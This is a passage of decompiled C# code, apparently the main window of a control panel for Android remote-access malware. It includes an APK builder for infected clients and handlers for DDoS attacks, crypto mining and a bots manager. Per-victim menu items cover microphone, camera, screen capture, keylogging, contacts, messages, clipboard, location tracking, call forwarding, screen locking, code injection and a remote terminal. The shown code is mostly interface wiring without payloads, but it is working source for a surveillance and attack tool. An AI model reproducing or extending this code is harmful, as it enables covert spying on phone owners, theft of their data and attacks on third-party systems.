							CS_0024_003C_003E8__locals78._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.Close();
							CS_0024_003C_003E8__locals78._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.Dispose();
							CS_0024_003C_003E8__locals78._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm = null;
						}
						BTAlerter.erroes(CS_0024_003C_003E8__locals78._0024VB_0024Local_ex.Message);
					}));
					ProjectData.ClearProjectError();
				}
			});
			thread.IsBackground = true;
			thread.Start();
			return "ok";
		}

		[DispId(2)]
		public void infos(string message)
		{
			BTAlerter.infos(message);
		}

		[DispId(3)]
		public void errors(string message)
		{
			BTAlerter.erroes(message);
		}

		[DispId(4)]
		public void disconnectserver(string serverip, string srvid)
		{
			_Closure_0024__5_002D0 arg = default(_Closure_0024__5_002D0);
			_Closure_0024__5_002D0 CS_0024_003C_003E8__locals11 = new _Closure_0024__5_002D0(arg);
			CS_0024_003C_003E8__locals11._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals11._0024VB_0024Local_srvid = srvid;
			CS_0024_003C_003E8__locals11._0024VB_0024Local_srvinfo = codes.getSinfoByip(mainform.AllServers, serverip);
			if (CS_0024_003C_003E8__locals11._0024VB_0024Local_srvinfo == null)
			{
				return;
			}
			CS_0024_003C_003E8__locals11._0024VB_0024Local_srvinfo.StopServer();
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				try
				{
					CS_0024_003C_003E8__locals11._0024VB_0024Me.mainform.AllServers.Remove(CS_0024_003C_003E8__locals11._0024VB_0024Local_srvinfo);
					CS_0024_003C_003E8__locals11._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals11._0024VB_0024Local_srvid, isconnected: false);
					CS_0024_003C_003E8__locals11._0024VB_0024Me.mainform.stateview.CoreWebView2.ExecuteScriptAsync($"updateServerStatus('{CS_0024_003C_003E8__locals11._0024VB_0024Local_srvid}','offline');");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}));
			foreach (BTClient value in BTEngine.clients.Values)
			{
				if (Operators.CompareString(value.Serverins.Address, serverip, TextCompare: false) == 0)
				{
					value.iamout();
				}
			}
		}

		[DispId(5)]
		public void buildApp(string serverip, string srvid)
		{
			Task.Run([SpecialName] () =>
			{
				ServersInfo sinfoByip = codes.getSinfoByip(mainform.AllServers, serverip);
				if (sinfoByip == null)
				{
					BTAlerter.infos("Server not connected");
				}
				else
				{
					string serverNextKey = ServersMgr.GetServerNextKey(serverip);
					mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						ApkMaker apkMaker = new ApkMaker(serverNextKey, sinfoByip.MainhttpClient, serverip, sinfoByip.SCkey, sinfoByip.DownloadHttpClient);
						apkMaker.Show();
					}));
				}
			});
		}

		[DispId(6)]
		public void DeleteServer(string srvid)
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] async () =>
				{
					if (MyMsg.Show(BTConst.delesrvrstr, BTConst.remvsrvrstr, MyMsg.msgtype.Confirm, use_no: true) == DialogResult.OK)
					{
						await mainform.homeview.ExecuteScriptAsync($"removeServer('{srvid}');");
					}
				}));
			});
			thread.IsBackground = true;
			thread.Start();
		}

		[DispId(7)]
		public void ExportServers(string jsonstr)
		{
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "ServerExports");
				Directory.CreateDirectory(text);
				string path = $"servers-export-{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.json";
				string path2 = Path.Combine(text, path);
				File.WriteAllText(path2, jsonstr);
				Process.Start("explorer.exe", text);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show($"Error exporting servers: {ex2.Message}");
				ProjectData.ClearProjectError();
			}
		}

		[DispId(8)]
		public void CheckLatency(string serverId, string ip)
		{
			Task.Run([SpecialName] () =>
			{
				int port = 80;
				int timeoutMillis = 2000;
				long num = codes.TcpPing(ip, port, timeoutMillis);
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					mainform.homeview.CoreWebView2.ExecuteScriptAsync($"UpdateServerLatency('{serverId}', {num})");
				}));
			});
		}
	}

	[ComVisible(true)]
	public class LeftPanelbridge
	{
		public Form1 mainform;

		public LeftPanelbridge(Form1 minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public object buttonclicked(string btnidf)
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					if (mainform.AllServers.Count == 0)
					{
						BTAlerter.infos(BTConst.plescnctsrvstr);
						mainform.navview.CoreWebView2.ExecuteScriptAsync("resetbtn('Home',true);");
					}
					else
					{
						mainform.btnclicked(btnidf);
					}
				}));
			});
			thread.IsBackground = true;
			thread.Start();
			return "null";
		}
	}

	[ComVisible(true)]
	public class blockbrige
	{
		public Form1 mainform;

		public blockbrige(Form1 minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public object unblockclient(string mobid, string address, string serverIp)
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				if (BTEngine.BlockedClients.Contains(mobid))
				{
					BTEngine.BlockedClients.Remove(mobid);
				}
				if (BTEngine.BlockedClients.Contains(address))
				{
					BTEngine.BlockedClients.Remove(address);
				}
				ServersMgr.RemoveServerBlockedClient(serverIp, address);
			});
			thread.IsBackground = true;
			thread.Start();
			return "null";
		}

		[DispId(2)]
		public object blockprement(string mobid, string address, string serverIp)
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				if (!string.IsNullOrWhiteSpace(mobid) && !string.IsNullOrWhiteSpace(address) && !string.IsNullOrWhiteSpace(serverIp))
				{
					if (!BTEngine.BlockedClients.Contains(mobid))
					{
						BTEngine.BlockedClients.Add(mobid);
					}
					if (!BTEngine.BlockedClients.Contains(address))
					{
						BTEngine.BlockedClients.Add(address);
					}
					ServersMgr.AddServerBlockedClient(serverIp, address, mobid);
				}
			});
			thread.IsBackground = true;
			thread.Start();
			return "null";
		}
	}

	[ComVisible(true)]
	public class updhostbridge
	{
		private readonly Form1 main;

		public updhostbridge(Form1 f)
		{
			main = f;
		}

		[DispId(1)]
		public void loadupdates(string serverip)
		{
			main.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				main.mywebview.Source = new Uri(Conversions.ToString(BTConst.getApiUrl(BTConst.api_changes, serverip)));
			}));
		}

		[DispId(2)]
		public void refresh(string serverip)
		{
			main.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				main.mywebview.CoreWebView2.Reload();
			}));
		}

		[DispId(3)]
		public void checkupdate(string serverip)
		{
			main.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				main.CheckUpdate(serverip, byuser: true);
			}));
		}
	}

	[ComVisible(true)]
	public class topclients
	{
		public Form1 mainform;

		public topclients(Form1 minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public string BroadcastAction()
		{
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.BroadCast();
			}));
			return "Broadcast OK";
		}

		[DispId(2)]
		public string RedirectAction()
		{
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.RedirectClients();
			}));
			return "Redirect OK";
		}

		[DispId(3)]
		public string UpdatesAction()
		{
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.UpdateClients();
			}));
			return "Updates OK";
		}

		[DispId(4)]
		public string BotsAction()
		{
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.BotsManager();
			}));
			return "Bots OK";
		}

		[DispId(5)]
		public string SearchTextChanged(string textValue)
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					mainform.SearchClients(textValue);
				}));
			});
			thread.IsBackground = true;
			thread.Start();
			return "Text received";
		}

		[DispId(6)]
		public string DDOS()
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					mainform.Ddosattacker();
				}));
			});
			thread.IsBackground = true;
			thread.Start();
			return "Text received";
		}

		[DispId(7)]
		public string miner()
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					mainform.openminer();
				}));
			});
			thread.IsBackground = true;
			thread.Start();
			return "Text received";
		}
	}

	public delegate void updateclient_dele(object[] objs);

	public delegate void AddClient_dele(object[] objs);

	public delegate void RemoveClient_dele(object[] objs);

	public class CellImages
	{
		public Image Avatar { get; set; }

		public Image Flag { get; set; }
	}

	public loader lodForm;

	public List<ServersInfo> AllServers;

	public Dictionary<string, Panel> clientPanels;

	public bool Alive;

	public string Allinjections;

	public ImageList Flags_images;

	private int start_W;

	private int start_H;

	private int start_barvwidth;

	private string startstamp;

	private SplashForm splash;

	private ResizeableControl _resizablePanel;

	private bool HideFlagicon;

	private double fadeSpeed;

	private readonly ConcurrentQueue<object[]> _pendingConnectionLogs;

	private int _connectionLogFlushScheduled;

	private readonly ConcurrentQueue<BTClient> _pendingClientUpdates;

	private int _clientUpdateFlushScheduled;

	private readonly ConcurrentQueue<object[]> _pendingClients;

	private int _clientFlushScheduled;

	private object locktable;

	private readonly ConcurrentQueue<BTClient> _pendingClientRemoves;

	private int _clientRemoveFlushScheduled;

	private int Myyy;

	private int Sh;

	private bool movY;

	private int Mx;

	private int Sw;

	private bool movX;

	private settingsfrm settingpage;

	private int unseenNotification;

	private BTBroadcast broadcastform;

	private apkinstaller appsinstaller;

	private BTApps appsmanager;

	private CancellationTokenSource _pingCts;

	private bool isClosingHandled;

	private bool checkingnow;

	private Redirector redirectform;

	private ijectionlab jectform;

	private readonly SolidBrush brushBackground;

	private readonly SolidBrush brushSelected;

	private readonly Pen penSelected;

	private readonly Color colorDefaultFore;

	private readonly Color colorSelectedFore;

	private Clientsupdater updateform;

	private BotsManager BotsForm;

	private minersmanager minerform;

	private ddosattacker ddosform;

	private int lastState;

	private string lastClientID;

	private string lastMultiSignature;

	private int _disconnectDetectorRunning;

	private const int ClientTimeoutSeconds = 120;

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnExit")]
	private DrakeUIButtonIcon _btnExit;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeWidth_W2")]
	private DrakeWidth_W _DrakeWidth_W2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statestimer")]
	private System.Windows.Forms.Timer _statestimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeWidth_W6")]
	private DrakeWidth_W _DrakeWidth_W6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearAllToolStripMenuItem")]
	private ToolStripMenuItem _ClearAllToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_mic")]
	private ToolStripMenuItem _ToolStrip_mic;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_manage")]
	private ToolStripMenuItem _ToolStrip_manage;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_files")]
	private ToolStripMenuItem _ToolStrip_files;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_scr")]
	private ToolStripMenuItem _ToolStrip_scr;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_cam")]
	private ToolStripMenuItem _ToolStrip_cam;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_msgs")]
	private ToolStripMenuItem _ToolStrip_msgs;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_contct")]
	private ToolStripMenuItem _ToolStrip_contct;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_apps")]
	private ToolStripMenuItem _ToolStrip_apps;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_clifolder")]
	private ToolStripMenuItem _ToolStrip_clifolder;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_trak")]
	private ToolStripMenuItem _ToolStrip_trak;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BlockToolStripMenuItem")]
	private ToolStripMenuItem _BlockToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem12")]
	private ToolStripMenuItem _ToolStripMenuItem12;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem13")]
	private ToolStripMenuItem _ToolStripMenuItem13;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_keylog")]
	private ToolStripMenuItem _ToolStrip_keylog;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem16")]
	private ToolStripMenuItem _ToolStripMenuItem16;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem17")]
	private ToolStripMenuItem _ToolStripMenuItem17;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_brows")]
	private ToolStripMenuItem _ToolStrip_brows;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_chat")]
	private ToolStripMenuItem _ToolStrip_chat;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_clipb")]
	private ToolStripMenuItem _ToolStrip_clipb;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_lockscr")]
	private ToolStripMenuItem _ToolStrip_lockscr;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("contimer")]
	private System.Windows.Forms.Timer _contimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_scrred")]
	private ToolStripMenuItem _ToolStrip_scrred;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_ject")]
	private ToolStripMenuItem _ToolStrip_ject;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NotesToolStripMenuItem")]
	private ToolStripMenuItem _NotesToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RenameToolStripMenuItem")]
	private ToolStripMenuItem _RenameToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RedirectToolStripMenuItem")]
	private ToolStripMenuItem _RedirectToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_location")]
	private ToolStripMenuItem _ToolStrip_location;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIScrollBar1")]
	private DrakeUIScrollBar _DrakeUIScrollBar1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToastToolStripMenuItem")]
	private ToolStripMenuItem _ToastToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OpenLinkToolStripMenuItem")]
	private ToolStripMenuItem _OpenLinkToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("VibrateToolStripMenuItem")]
	private ToolStripMenuItem _VibrateToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TerminalToolStripMenuItem")]
	private ToolStripMenuItem _TerminalToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallPhoneToolStripMenuItem")]
	private ToolStripMenuItem _CallPhoneToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallForwardingToolStripMenuItem")]
	private ToolStripMenuItem _CallForwardingToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel9")]
	private Panel _Panel9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("hidbtn")]
	private DrakeUIButtonIcon _hidbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeWidth_W7")]
	private DrakeWidth_W _DrakeWidth_W7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FadeInTimer")]
	private System.Windows.Forms.Timer _FadeInTimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RemoteSSHToolStripMenuItem")]
	private ToolStripMenuItem _RemoteSSHToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RemoteTelnetToolStripMenuItem")]
	private ToolStripMenuItem _RemoteTelnetToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStrip_blocker")]
	private ToolStripMenuItem _ToolStrip_blocker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("minimizbtn")]
	private DrakeUIButtonIcon _minimizbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("autounlktoolstrip")]
	private ToolStripMenuItem _autounlktoolstrip;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("admintoolstrip")]
	private ToolStripMenuItem _admintoolstrip;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon btnExit
	{
		[CompilerGenerated]
		get
		{
			return _btnExit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _btnExit;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_btnExit = value;
			drakeUIButtonIcon = _btnExit;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeWidth_W DrakeWidth_W2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeWidth_W2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DrakeWidth_W8_MouseDown;
			MouseEventHandler value3 = DrakeWidth_W8_MouseMove;
			MouseEventHandler value4 = DrakeWidth_W8_MouseUp;
			DrakeWidth_W drakeWidth_W = _DrakeWidth_W2;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown -= value2;
				drakeWidth_W.MouseMove -= value3;
				drakeWidth_W.MouseUp -= value4;
			}
			_DrakeWidth_W2 = value;
			drakeWidth_W = _DrakeWidth_W2;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown += value2;
				drakeWidth_W.MouseMove += value3;
				drakeWidth_W.MouseUp += value4;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer statestimer
	{
		[CompilerGenerated]
		get
		{
			return _statestimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = connecttimer_Tick;
			System.Windows.Forms.Timer timer = _statestimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statestimer = value;
			timer = _statestimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	public virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DGV0_MouseDoubleClick;
			DataGridViewCellPaintingEventHandler value3 = DataGridView1_CellPainting;
			MouseEventHandler value4 = DGV0_MouseWheel;
			ScrollEventHandler value5 = DGV0_Scroll;
			EventHandler value6 = DGV0_SelectionChanged;
			DataGridViewCellEventHandler value7 = DGV0_CellClick;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.MouseDoubleClick -= value2;
				dataGridView.CellPainting -= value3;
				dataGridView.MouseWheel -= value4;
				dataGridView.Scroll -= value5;
				dataGridView.SelectionChanged -= value6;
				dataGridView.CellClick -= value7;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.MouseDoubleClick += value2;
				dataGridView.CellPainting += value3;
				dataGridView.MouseWheel += value4;
				dataGridView.Scroll += value5;
				dataGridView.SelectionChanged += value6;
				dataGridView.CellClick += value7;
			}
		}
	}

	[field: AccessedThroughProperty("DashboardPanel")]
	internal virtual Panel DashboardPanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeWidth_W DrakeWidth_W6
	{
		[CompilerGenerated]
		get
		{
			return _DrakeWidth_W6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = maintitle_MouseDown;
			DrakeWidth_W drakeWidth_W = _DrakeWidth_W6;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown -= value2;
			}
			_DrakeWidth_W6 = value;
			drakeWidth_W = _DrakeWidth_W6;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("BTtiptool")]
	internal virtual DrakeUIToolTip BTtiptool
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panel_DGV0")]
	internal virtual Panel panel_DGV0
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panel_CONLIST")]
	internal virtual Panel panel_CONLIST
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctx_cons")]
	internal virtual DrakeUIContextMenuStrip ctx_cons
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ClearAllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ClearAllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClearAllToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ClearAllToolStripMenuItem = value;
			toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ctx_clients")]
	internal virtual DrakeUIContextMenuStrip ctx_clients
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStrip_mic
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_mic;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_mic;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_mic = value;
			toolStripMenuItem = _ToolStrip_mic;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_manage
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_manage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem2_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_manage;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_manage = value;
			toolStripMenuItem = _ToolStrip_manage;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_files
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_files;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem3_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_files;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_files = value;
			toolStripMenuItem = _ToolStrip_files;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_scr
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_scr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem4_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_scr;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_scr = value;
			toolStripMenuItem = _ToolStrip_scr;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_cam
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_cam;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem5_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_cam;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_cam = value;
			toolStripMenuItem = _ToolStrip_cam;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStrip_conct")]
	internal virtual ToolStripMenuItem ToolStrip_conct
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStrip_msgs
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_msgs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem7_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_msgs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_msgs = value;
			toolStripMenuItem = _ToolStrip_msgs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_contct
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_contct;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem8_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_contct;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_contct = value;
